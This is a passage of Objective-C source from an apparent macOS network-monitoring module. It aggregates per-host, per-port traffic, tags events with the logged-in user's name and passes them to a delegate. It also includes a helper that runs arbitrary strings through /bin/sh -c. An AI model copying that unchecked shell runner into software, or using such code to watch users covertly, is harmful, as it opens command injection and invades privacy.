                                [dataIn addObject:[NSNumber numberWithInt:(int)[temp mSize]]];
                                [dataOut addObject:[NSNumber numberWithInt:0]];
                                [packetIn addObject:[NSNumber numberWithInt:(int)[temp mPacketCount]]];
                                [packetOut addObject:[NSNumber numberWithInt:0]];
                            }
                        }
                    }else if ( [temp mDirection] == kDirectionTypeUpload ) {
                        if ([[temp mDestination] isEqualToString:[countIP objectAtIndex:j]]) {
                            if ([port containsObject:[NSNumber numberWithInt:(int)[temp mPort]]]) {
                                int index =-1;
                                for (int l = 0; l < [port count]; l++) {
                                    if ((int)[[port objectAtIndex:l] integerValue] == (int)[temp mPort]) {
                                        index = l;
                                    }
                                }
                                if (index != -1) {
                                    [dataOut replaceObjectAtIndex:index withObject:[NSNumber numberWithInt:(int)[temp mSize]]];
                                    [packetOut replaceObjectAtIndex:index withObject:[NSNumber numberWithInt:(int)[temp mPacketCount]]];
                                }
                            }else{
                                [transportType addObject:[NSNumber numberWithInt:(int)[temp mTransportProtocol]]];
                                [port addObject:[NSNumber numberWithInt:(int)[temp mPort]]];
                                [dataIn addObject:[NSNumber numberWithInt:0]];
                                [dataOut addObject:[NSNumber numberWithInt:(int)[temp mSize]]];
                                [packetIn addObject:[NSNumber numberWithInt:0]];
                                [packetOut addObject:[NSNumber numberWithInt:(int)[temp mPacketCount]]];
                            }
                        }
                    }
                }
                
                for (int k=0; k < [port count]; k++) {
                    FxTraffic * traffic = [[FxTraffic alloc]init];
                    [traffic setMTransportType:[[transportType objectAtIndex:k] integerValue]];
                    [traffic setMFxProtocolType:[self getProtocolTypeByPortNum:[[port objectAtIndex:k] intValue]]];
                    [traffic setMPortNumber:[[port objectAtIndex:k] integerValue]];
                    [traffic setMPacketsIn:[[packetIn objectAtIndex:k] integerValue]];
                    [traffic setMIncomingTrafficSize:[[dataIn objectAtIndex:k] integerValue]];
                    [traffic setMPacketsOut:[[packetOut objectAtIndex:k] integerValue]];
                    [traffic setMOutgoingTrafficSize:[[dataOut objectAtIndex:k] integerValue]];
                    [fxTraffic addObject:traffic];
                    [traffic release];
                }
                
                [remoteHost setMTraffics:fxTraffic];
                [fxRemoteHost addObject:remoteHost];
                
                [fxTraffic release];
                [remoteHost release];
                [packetOut release];
                [packetIn release];
                [dataOut release];
                [dataIn release];
                [port release];
                [transportType release];
            }
        }
        [networkInterface setMRemoteHosts:fxRemoteHost];
        [fxNetworkInterface addObject:networkInterface];
        
        [fxRemoteHost release];
        [countMyIP release];
        [countIP release];
        [hostName release];
    }
    
    [interfaceName release];
    [interfaceType release];
    [countOwnIP release];
    [masterData release];
    
   return  [fxNetworkInterface autorelease];
}



-(void) sendData {
    
//    DLog(@"mStartTime %@",self.mStartTime);
//    DLog(@"mEndTime %@",[DateTimeFormat phoenixDateTime]);
//    DLog(@"###### mTotalDownloadByLan %d Count",[self.mTotalDownloadByLan count]);
//    [NTPacket printDetail:self.mTotalDownloadByLan];
//    DLog(@"###### mTotalUploadByLan %d Count",[self.mTotalUploadByLan count]);
//    [NTPacket printDetail:self.mTotalUploadByLan];
//    DLog(@"###### mTotalDownloadByWifi %d Count",[self.mTotalDownloadByWifi count]);
//    [NTPacket printDetail:self.mTotalDownloadByWifi];
//    DLog(@"###### mTotalUploadByWifi %d Count",[self.mTotalUploadByWifi count]);
//    [NTPacket printDetail:self.mTotalUploadByWifi];
    
    if ([mDelegate respondsToSelector:mSelector]) {
        DLog(@"### SendData");
        FxNetworkTrafficEvent * trafficEvent = [[FxNetworkTrafficEvent alloc]init];
        [trafficEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        [trafficEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
        [trafficEvent setMApplicationID:@""];
        [trafficEvent setMApplicationName:@""];
        [trafficEvent setMTitle:@""];
        [trafficEvent setMStartTime:self.mStartTime];
        [trafficEvent setMEndTime:[DateTimeFormat phoenixDateTime]];
        
        NSMutableArray *allNetworkInterfaces = [[NSMutableArray alloc]init];
        
        NSMutableArray * mergeByLan = [[NSMutableArray alloc]initWithArray:[self mergeDownload:self.mTotalDownloadByLan AndUpload:self.mTotalUploadByLan]];
        if ([mergeByLan count]>0) {
            [allNetworkInterfaces addObjectsFromArray:mergeByLan];
        }
        [mergeByLan release];
        
        NSMutableArray * mergeByWifi = [[NSMutableArray alloc]initWithArray:[self mergeDownload:self.mTotalDownloadByWifi AndUpload:self.mTotalUploadByWifi]];
        if ([mergeByWifi count]>0) {
            [allNetworkInterfaces addObjectsFromArray:mergeByWifi];
        }
        [mergeByWifi release];
        
        if ([allNetworkInterfaces count] > 0) {
            [trafficEvent setMNetworkInterfaces:allNetworkInterfaces];
            [mDelegate performSelector:mSelector onThread:mThread withObject:trafficEvent waitUntilDone:NO];
        }
        [allNetworkInterfaces release];
        [trafficEvent release];
    }
}

#pragma mark ### GET Utility

- (void)getCurrentIPAddress {
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;
    success = getifaddrs(&interfaces);
    if (success == 0) {
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"]) {
                    self.mEn0IP = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                }
                else if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en1"]) {
                    self.mEn1IP = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
    }
    freeifaddrs(interfaces);
}

-(FxProtocolType) getProtocolTypeByPortNum:(int)aPort{
    int result = -1;
    if (aPort == 1) {
        result = kProtocolTypeTCPMUX;
    }else if (aPort == 5) {
        result = kProtocolTypeRJE;
    }else if (aPort == 7) {
        result = kProtocolTypeECHO;
    }else if (aPort == 18) {
        result = kProtocolTypeMSP;
    }else if (aPort == 20) {
        result = kProtocolTypeFTPData;
    }else if (aPort == 21) {
        result = kProtocolTypeFTPControl;
    }else if (aPort == 22) {
        result = kProtocolTypeSSH;
    }else if (aPort == 23) {
        result = kProtocolTypeTelnet;
    }else if (aPort == 25) {
        result = kProtocolTypeSMTP;
    }else if (aPort == 29) {
        result = kProtocolTypeMSGICP;
    }else if (aPort == 37) {
        result = kProtocolTypeTime;
    }else if (aPort == 42) {
        result = kProtocolTypeHostNameServer;
    }else if (aPort == 43) {
        result = kProtocolTypeWhoIs;
    }else if (aPort == 49) {
        result = kProtocolTypeLoginHostProtocol;
    }else if (aPort == 53) {
        result = kProtocolTypeDNS;
    }else if (aPort == 69) {
        result = kProtocolTypeTFTP;
    }else if (aPort == 70) {
        result = kProtocolTypeGopher;
    }else if (aPort == 79) {
        result = kProtocolTypeFinger;
    }else if (aPort == 80) {
        result = kProtocolTypeHTTP;
    }else if (aPort == 103) {
        result = kProtocolTypeX400;
    }else if (aPort == 108) {
        result = kProtocolTypeSNA;
    }else if (aPort == 109) {
        result = kProtocolTypePOP2;
    }else if (aPort == 110) {
        result = kProtocolTypePOP3;
    }else if (aPort == 115) {
        result = kProtocolTypeSFTP;
    }else if (aPort == 118) {
        result = kProtocolTypeSQLService;
    }else if (aPort == 119) {
        result = kProtocolTypeNNTP;
    }else if (aPort == 137) {
        result = kProtocolTypeNetBIOSNameService;
    }else if (aPort == 139) {
        result = kProtocolTypeNetBIOSDatagramService;
    }else if (aPort == 143) {
        result = kProtocolTypeIMAP;
    }else if (aPort == 150) {
        result = kProtocolTypeNetBIOSSessionService;
    }else if (aPort == 156) {
        result = kProtocolTypeSQLServer;
    }else if (aPort == 161) {
        result = kProtocolTypeSNMP;
    }else if (aPort == 179) {
        result = kProtocolTypeBGP;
    }else if (aPort == 190) {
        result = kProtocolTypeGACP;
    }else if (aPort == 194) {
        result = kProtocolTypeIRC;
    }else if (aPort == 197) {
        result = kProtocolTypeDLS;
    }else if (aPort == 389) {
        result = kProtocolTypeLDAP;
    }else if (aPort == 396) {
        result = kProtocolTypeNovellNetware;
    }else if (aPort == 443) {
        result = kProtocolTypeHTTPS;
    }else if (aPort == 444) {
        result = kProtocolTypeSNPP;
    }else if (aPort == 445) {
        result = kProtocolTypeMicrosoftDS;
    }else if (aPort == 458) {
        result = kProtocolTypeAppleQuickTime;
    }else if (aPort == 546) {
        result = kProtocolTypeDHCP_Client;
    }else if (aPort == 547) {
        result = kProtocolTypeDHCP_Server;
    }else if (aPort == 563) {
        result = kProtocolTypeSNEW;
    }else if (aPort == 569) {
        result = kProtocolTypeMSN;
    }else if (aPort == 1080) {
        result = kProtocolTypeSocks;
    }
    if (result == -1) {
        result = kProtocolTypeUnknown;
    }
    return result;
}

-(NSString *) getSource:(NSString *)aString {
    NSString * result=@"";
    if ([aString rangeOfString:@"Referer: "].location != NSNotFound) {
        result = [[[[aString componentsSeparatedByString:@"Referer: "] objectAtIndex:1] componentsSeparatedByString:@"\n"] objectAtIndex:0];
    }
    return result;
}

-(NSString *)getOnlyHostname:(NSString *)aString{
    NSArray * spliter = [[[NSArray alloc]initWithArray:[aString componentsSeparatedByString:@"domain name pointer "]] autorelease];
    if ([spliter count]>1) {
        return [spliter objectAtIndex:1];
    }
    return @"";
}

#pragma mark ### CommandRunner

- (NSString*) runAsCommand :(NSString *)aCmd {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    
    NSPipe* pipe = [NSPipe pipe];
    NSTask* task = [[NSTask alloc] init];
    [task setLaunchPath: @"/bin/sh"];
    [task setArguments:@[@"-c", aCmd]];
    [task setStandardOutput:pipe];
    
    NSFileHandle* file = [pipe fileHandleForReading];
    [task launch];
    
    NSData *data = [file readDataToEndOfFile];
    
    [task waitUntilExit];
    [task release];
    
    NSString * result = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    [file closeFile];
    
    [pool drain];
    
    return [result autorelease];
}


#pragma mark ### Destroy

-(void)dealloc{
    [self stopCapture];
    
    [mEn0IP release];
    [mEn1IP release];
    [mUsedInterfaceHandle1 release];
    [mUsedInterfaceHandle2 release];
    [mTotalDownloadByLan release];
    [mTotalUploadByLan release];
    [mTotalDownloadByWifi release];
    [mTotalUploadByWifi release];
    [super dealloc];
}
@end
